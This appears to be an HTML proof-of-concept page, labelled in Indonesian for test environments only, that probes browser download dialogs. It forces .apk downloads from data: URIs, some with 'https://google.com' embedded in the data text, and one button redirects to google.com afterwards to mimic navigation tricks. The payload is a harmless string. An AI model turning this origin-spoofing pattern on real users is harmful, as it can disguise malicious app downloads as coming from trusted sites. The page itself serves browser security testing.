<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <title>PoC: data variations (fixed)</title>
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <style>
    body{font-family:system-ui,Segoe UI,Roboto,Arial;margin:20px;max-width:900px}
    h2{margin-top:0}
    button{margin:6px 6px 6px 0;padding:8px 12px;cursor:pointer}
    pre{background:#f6f6f6;padding:10px;border-radius:6px;white-space:pre-wrap}
    .note{color:#444;font-size:0.95rem}
    .section{margin-top:12px}
  </style>
</head>
<body>
  <h2>PoC — data: variations (fixed)</h2>
  <p class="note">Uji hanya di lingkungan pengujian. Klik tombol lalu perhatikan teks pada dialog download.</p>

  <div class="section">
    <button onclick="dl('data: ')">Tombol 1 — data + space</button>
    <button onclick="dl('data:text/plain,source%3A%20https%3A%2F%2Fgoogle.com')">Tombol 2 — data (URL-encoded contains https://google.com)</button>
    <button onclick="dl('data:text/plain,https://google.com,more')">Tombol 3 — data:text/plain contains literal https://google.com</button>
  </div>

  <div class="section">
    <button onclick="openWin()">Tombol 4 — Puf short base64 + redirect</button>
    <button onclick="openWin2()">Tombol 5 — Puf long base64 (no redirect)</button>
  </div>

  <div class="section">
    <h3>Console / Info</h3>
    <pre id="log">Ready. Klik tombol untuk membuat download.</pre>
  </div>

<script>
/* Puf: create <a> anchor, set download & href, click, then remove */
function Puf(uri, name) {
  try {
    const link = document.createElement("a");
    link.download = name || '';
    link.href = uri;
    // append to DOM to make sure click works in all browsers
    document.body.appendChild(link);
    link.click();
    setTimeout(()=> link.remove(), 50);
    log('Puf() triggered:\\n  href: ' + uri + '\\n  download: ' + name);
  } catch (e) {
    log('Puf() error: ' + e);
  }
}

/* Simple wrapper to create anchor and force download for non-Puf tests */
function doAnchor(href, name){
  const a = document.createElement('a');
  a.href = href;
  a.download = name || 'download';
  document.body.appendChild(a);
  a.click();
  setTimeout(()=> a.remove(), 50);
  log('Triggered download:\\n  href: ' + href + '\\n  download: ' + name);
}

/* Generic download wrapper used by Tombol 1-3 */
function dl(href){
  const name = 'test-file.apk';
  doAnchor(href, name);
}

/* Tombol 4: use Puf with a short base64 data:apk then redirect to google.com */
function openWin(){
  // short base64 sample (small payload)
  const uri = "data:application/vnd.android.package-archive;base64,UGVhY2UgQmUgVXBvbiBZb3U=";
  const name = "Testing.apk";
  Puf(uri, name);
  // redirect after triggering download (useful to simulate navigation tricks)
  setTimeout(()=> { location.replace("http://google.com"); }, 200);
}

/* Tombol 5: use Puf with long base64 (repeated) and do NOT redirect */
function openWin2(){
  const longB64 = "data:application/vnd.android.package-archive;base64," +
    "UGVhY2UgQmUgVXBvbiBZb3U=UGVhY2UgQmUgVXBvbiBZb3U=UGVhY2UgQmUgVXBvbiBZb3U=" +
    "UGVhY2UgQmUgVXBvbiBZb3U=UGVhY2UgQmUgVXBvbiBZb3U=UGVhY2UgQmUgVXBvbiBZb3U=";
  const name = "Testing-long.apk";
  Puf(longB64, name);
}

/* small logger */
function log(s){ document.getElementById('log').textContent = s; }
</script>

<!-- Optional "open" button you previously had -->
<center style="margin-top:18px"><h2>Peace Be Upon You</h2></center>

<!-- If you still want the old single 'open' button that triggers openWin(), uncomment next line -->
<!-- <input type="button" onclick="openWin();" value="open"/> -->

</body>
</html>
